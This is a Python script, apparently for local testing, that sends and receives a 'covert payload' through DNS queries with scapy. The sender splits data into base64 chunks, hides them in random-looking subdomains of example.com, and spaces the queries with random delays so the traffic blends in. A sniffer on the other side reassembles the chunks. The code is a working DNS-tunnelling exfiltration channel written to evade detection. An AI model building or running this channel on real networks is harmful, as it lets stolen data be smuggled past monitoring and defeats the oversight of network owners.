# Combined Script for Sending and Receiving Covert Payload via DNS on Windows Machine

import os
import random
import string
import time
import base64
from scapy.all import *

# Configuration
DOMAIN = "example.com"  # Domain for DNS queries
dns_servers = ["192.168.86.132"]  # Use local IP address for testing
received_chunks = []

# Function to handle incoming DNS packets
def dns_sniffer(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qd is not None:  # Capture only valid DNS query packets
        try:
            query_name = packet.getlayer(DNS).qd.qname.decode().strip('.')
            
            # Filter packets to only process those with the target domain
            if DOMAIN in query_name:
                print(f"Received query: {query_name}")
                
                # Extract the data chunk from the subdomain (first part of the query name)
                if '-' in query_name:
                    split_query = query_name.split('-')
                    if len(split_query) > 1:
                        data_chunk = split_query[1].split('.')[0]
                        try:
                            # Decode the chunk (assuming base64 encoded data)
                            decoded_chunk = base64.urlsafe_b64decode(data_chunk + '==').decode()
                            received_chunks.append(decoded_chunk)
                        except Exception as e:
                            print(f"Failed to decode chunk: {data_chunk}, error: {e}")

                # Print the current reassembled payload
                reassembled_payload = ''.join(received_chunks)
                print(f"Reassembled Payload so far: {reassembled_payload}")
        except IndexError as e:
            print(f"Failed to process packet: {e}")
        except Exception as e:
            print(f"Unexpected error: {e}")

# Send Covert Payload Using DNS
def send_covert_payload(payload, domain=DOMAIN):
    """
    Sends a covert payload using DNS queries to hide the transmission.
    Args:
        payload (str): The secret message to send covertly.
        domain (str): The domain for DNS query-based transmission.
    """
    # Split payload into small chunks to be hidden in DNS requests
    chunk_size = 10  # Smaller chunks for better blending in
    payload_chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
    
    for chunk in payload_chunks:
        # Encode the chunk to make it look less suspicious
        encoded_chunk = base64.urlsafe_b64encode(chunk.encode()).decode().rstrip('=')
        
        # Add a random prefix for a more natural-looking subdomain
        random_label = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
        query_domain = f"{random_label}-{encoded_chunk}.{domain}"
        
        # Construct the DNS packet
        packet = IP(dst=random.choice(dns_servers)) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_domain))
        
        # Send the packet
        send(packet, verbose=False)
        time.sleep(random.uniform(0.5, 2.0))  # Random delay for more natural traffic

# Start sending and receiving DNS packets
if __name__ == "__main__":
    # Example payload to send covertly
    secret_payload = "This is a secret payload."
    
    # Start a sniffer in a separate thread
    import threading
    sniffer_thread = threading.Thread(target=lambda: sniff(filter="udp port 53 and udp[10] & 0x80 = 0", prn=dns_sniffer))
    sniffer_thread.daemon = True
    sniffer_thread.start()
    
    # Send the covert payload
    send_covert_payload(secret_payload)

    print("Payload transmitted.")